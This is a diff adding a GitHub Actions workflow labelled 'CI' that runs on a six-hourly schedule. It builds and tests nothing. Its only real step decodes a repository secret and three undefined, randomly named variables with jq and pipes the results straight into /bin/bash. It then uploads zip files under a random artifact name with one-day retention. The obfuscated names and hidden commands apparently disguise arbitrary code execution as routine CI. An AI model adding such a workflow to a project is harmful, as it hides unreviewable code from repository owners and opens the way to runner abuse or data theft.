@@ -1,0 +1,34 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          e038: ${{ secrets.e038 }}
+        run: |
+          printf '%s' "$e038" | jq -r .hbped7 | /bin/bash
+          echo $czorh51310 | jq -r .hluwz26489 | /bin/bash
+          echo $jqidx44885 | jq -r .lv8 | /bin/bash
+          printf '%s' "$iftg3626" | jq -r .la2 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: OyPcCM0R
+          path: "*.zip"
+          retention-days: 1
